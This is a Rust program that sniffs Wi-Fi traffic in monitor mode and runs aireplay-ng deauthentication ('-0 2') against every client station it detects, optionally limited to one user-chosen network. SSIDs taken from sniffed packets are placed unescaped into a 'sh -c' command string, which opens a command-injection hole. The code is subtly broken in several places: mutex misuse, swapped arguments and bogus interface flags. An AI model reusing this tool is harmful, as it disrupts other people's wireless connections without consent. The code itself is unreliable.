


use std::ffi::CString;


use std::{io, ptr};
use std::io::{BufRead, Error};
use std::os::macos::raw;
use std::os::unix::io::RawFd;
use nix::libc::{c_char, c_int, c_ulong, ioctl};
use pcap::{Active, Capture, Device, Packet, Activated, Savefile};
use std::process::{Command, Stdio};
use std::ptr::NonNull;
use std::sync::Arc;
use nix::libc;
use nix::net::if_::Interface;
use tokio::runtime::Runtime;
use tokio::signal::ctrl_c;
use tokio::sync::Mutex;


const IFNAMSIZ: usize = 16;
const SIOCGIWNAME: c_int = 0x8B01;
const SIOCGIFFLAGS: c_ulong = 0x8913;
const SIOCSIFFLAGS: c_ulong = 0x8914;
const IFF_UP: c_int = 0x1;
const IFF_RUNNING: c_int = 0x40;
const IW_MODE_MONITOR: c_int = 6;

#[repr(C)]
struct ifreq {
    ifr_name: [c_char; IFNAMSIZ],
    ifr_flags: c_int,
}

mod socket {
    use super::*;

    pub fn create_socket() -> Result<RawFd, String> {
        let sock = unsafe { libc::socket(libc::AF_INET, libc::SOCK_DGRAM, libc::IPPROTO_IP) };
        if sock == -1 {
            return Err("Failed to create socket".to_owned());
        }
        Ok(sock)
    }

    pub fn close_socket(sock: RawFd) -> Result<(), String> {
        let result = unsafe { libc::close(sock) };
        if result == -1 {
            return Err("Failed to close socket".to_owned());
        }
        Ok(())
    }
}

mod interface {
    use nix::libc::c_ulong;
    use super::*;

    pub fn check_interface_existence(sock: RawFd, interface: &str) -> Result<(), String> {
        let mut ifr: ifreq = unsafe { std::mem::zeroed() };
        let interface_bytes = interface.as_bytes();
        ifr.ifr_name[..interface.len()].copy_from_slice(unsafe {
            std::slice::from_raw_parts(
                interface_bytes.as_ptr() as *const i8,
                interface_bytes.len() + 1,
            )
        });


        if unsafe { ioctl(sock, SIOCGIWNAME as c_ulong, &ifr) } == -1 {
            return Err("Interface does not exist".to_owned());
        }
        Ok(())
    }

    pub fn set_interface_monitor_mode(sock: RawFd, interface: &str) -> Result<(), String> {
        let mut ifr: ifreq = unsafe { std::mem::zeroed() };
        let interface_bytes = interface.as_bytes();
        ifr.ifr_name[..interface.len()].copy_from_slice(unsafe {
            std::slice::from_raw_parts(
                interface_bytes.as_ptr() as *const i8,
                interface_bytes.len() + 1,
            )
        });

        if unsafe { ioctl(sock, SIOCGIFFLAGS, &mut ifr) } == -1 {
            return Err("Failed to get interface flags".to_owned());
        }

        ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
        ifr.ifr_flags &= !IFF_RUNNING;
        ifr.ifr_flags |= IFF_RUNNING;
        ifr.ifr_flags |= IW_MODE_MONITOR;

        if unsafe { ioctl(sock, SIOCSIFFLAGS, &ifr) } == -1 {
            return Err("Failed to set interface to monitor mode".to_owned());
        }

        Ok(())
    }
}

pub fn start_capture(interface:  Arc<Mutex<Capture<Active>>>, interface_name: &str, bssid: Option<String>) {
    let mut connected_stations: Vec<String> = Vec::new();


    while let Ok(packet) = interface.lock().next_packet() {
        let (mac, ssid) = handle_packet(&packet).unwrap();
        if bssid.is_some()
        {
            let bssid = bssid.unwrap();
            if &ssid != &bssid {
                continue;
            } else {
                proccess(&ssid, &mac, interface_name, &mut connected_stations);
            }
        }

        proccess(&ssid, &mac, interface_name, &mut connected_stations);
    }


    fn handle_packet(packet: &Packet) -> Option<(String, String)>
    {
        let data = packet.data;

        // Parse Wi-Fi packets (assuming IEEE 802.11 format)
        if data.len() > 24 && data[12..14] == [0x08, 0x00] && data[23] == 0x08 {
            let source_mac = &data[16..22];
            let ssid_length = data[24] as usize;

            // Process the source MAC address
            let source_mac_string = format!(
                "{:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
                source_mac[0], source_mac[1], source_mac[2], source_mac[3], source_mac[4], source_mac[5]
            );
            println!("Source MAC: {}", source_mac_string);

            // Process the SSID (dssid)
            let ssid = if data.len() >= 25 + ssid_length {
                let ssid = &data[25..25 + ssid_length];
                let ssid_string = String::from_utf8_lossy(ssid);
                println!("SSID: {}", ssid_string);
                ssid_string.to_string()
            } else { return None; };
            return Some((source_mac_string, ssid));
        }
        None
    }

    fn proccess(bssid: &String, station: &String, interface: &str, connected_st: &mut Vec<String>) {
        process_packet(bssid, &station, connected_st);
        execute_aireplay_ng(bssid, station, interface);
    }
}

fn process_packet(bssid: &String, station: &String, connected_stations: &mut Vec<String>) {

    // Check if the packet matches the provided BSSID, if it's specified

    if !connected_stations.contains(station) {
        connected_stations.push(station.into());
        println!("User reconnected!");
        println!("BSSID: {}", bssid);
        println!("Station: {}", station);
    }
}


fn execute_aireplay_ng(bssid: &String, station: &String, interface: &str) {
    // Check if the packet contains the necessary information (BSSID and STATION)
    // Construct the aireplay-ng command
    let command = format!("aireplay-ng -0 2 -a {} -c {} {}", station, bssid, interface);

    // Execute the aireplay-ng command
    let output = Command::new("sh")
        .arg("-c")
        .arg(&command)
        .output()
        .expect("Failed to execute aireplay-ng");

    // Check if the command was executed successfully
    if output.status.success() {
        println!("aireplay-ng command executed successfully");
    } else {
        println!("Failed to execute aireplay-ng command");
        if let Ok(stderr) = String::from_utf8(output.stderr) {
            println!("Error message: {}", stderr);
        }
    }
}

fn main() {
    let interface_name = "mon0";
    let sock = match socket::create_socket() {
        Ok(sock) => sock,
        Err(err) => {
            eprintln!("Failed to create socket: {}", err);
            return;
        }
    };

    if let Err(err) = interface::check_interface_existence(sock, interface_name) {
        eprintln!("Interface does not exist: {}", err);
        return;
    }

    if let Err(err) = interface::set_interface_monitor_mode(sock, interface_name) {
        eprintln!("Failed to set interface to monitor mode: {}", err);
        return;
    }

    if let Err(err) = socket::close_socket(sock) {
        eprintln!("Failed to close socket: {}", err);
        return;
    }

    println!("Interface {} is now in monitor mode", interface_name);

    let mut rt = Runtime::new().unwrap();
    let  interface = Device::list()
        .unwrap()
        .into_iter()
        .find(|dev| dev.name == interface_name)
        .expect("Interface not found")
        .open()
        .expect("Failed to open interface");

    let interface = Arc::new(Mutex::new(interface));;

    rt.block_on(async {
        let (stop_tx, stop_rx) = tokio::sync::oneshot::channel();
        let capture_task = tokio::spawn(async move {
            let chosen_bssid = get_user_input();

            /// TODO
            let interface = start_capture(Arc::clone(&interface), interface_name, chosen_bssid);
        });
        let _ = ctrl_c().await;
        println!("\nCapture stopped by user");




      let mut result =  interface.lock().await.savefile("capture.pcap").unwrap();
        while let Ok(data) = interface.next_packet() {
            result.write(&data);

        }


        // Close airodump-ng
        Command::new("pkill")
            .arg("airodump-ng")
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .output()
            .expect("Failed to close airodump-ng");

        stop_tx.send(()).unwrap();
        let _ = capture_task.await;
    });
}


fn get_user_input() -> Option<String> {
    println!("Enter the BSSID you want to monitor (or leave it blank to monitor all connections):");
    let stdin = io::stdin();
    let mut input = String::new();
    if let Ok(_) = stdin.lock().read_line(&mut input) {
        let trimmed = input.trim();
        if trimmed.is_empty() {
            None
        } else {
            Some(trimmed.to_owned())
        }
    } else {
        None
    }
}